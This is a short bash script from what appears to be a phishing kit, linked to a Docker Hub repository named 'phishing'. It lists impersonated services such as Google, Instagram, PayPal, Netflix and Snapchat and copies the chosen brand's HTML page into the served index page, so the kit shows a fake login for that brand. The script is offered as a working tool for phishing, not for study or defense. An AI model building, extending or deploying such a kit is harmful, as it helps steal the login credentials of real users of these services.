# usage bash chaneg.sh <servicename>[instagram, snapchat , default etc]
git pull

echo 
echo 
echo "------------------"
echo "use default for using the default site"
echo "All options are " 
echo google
echo instagram
echo facebook 
echo linkedin
echo microsoft 
echo netflix
echo spotify 
echo paypal
echo twitter
echo instafollowers
echo snapchat 
echo "more comming soon stay updated at https://hub.docker.com/repository/docker/insomniaccoder/phishing"
echo "--------------------------------"
echo 
if [ -f $1.html ]
    then 
        cp src/$1.html src/index.html
        echo "Done changing main site to $1" 
fi

if [ ! -f $1.html ]
    then 
        cp src/default.html src/index.html
        echo "ERROR 404 $1 not found changing to default "
fi
